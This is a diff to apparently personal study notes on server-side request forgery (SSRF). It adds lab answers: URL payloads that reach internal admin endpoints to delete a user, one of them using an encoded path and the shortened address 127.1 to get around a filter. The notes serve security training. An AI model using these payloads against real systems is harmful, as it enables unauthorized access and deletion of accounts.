@@ -22,3 +22,20 @@ Exploiting SSRF
 
 ##2- Blind / Out-of-Band SSRF
 1. Attempt to make the vulnerable server send an HTTP/DNS/ICMP request to an external server that you control and then check the logs for any connections.
+
+
+
+
+Lab 1:
+http://localhost/admin/delete?username=carlos
+
+Lab 2:
+http://192.168.0.233:8080/admin/delete?username=carlos
+
+Lab 3:
+Must use burp collaborator.
+
+Lab 4:
+http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
+
+Lab 5:
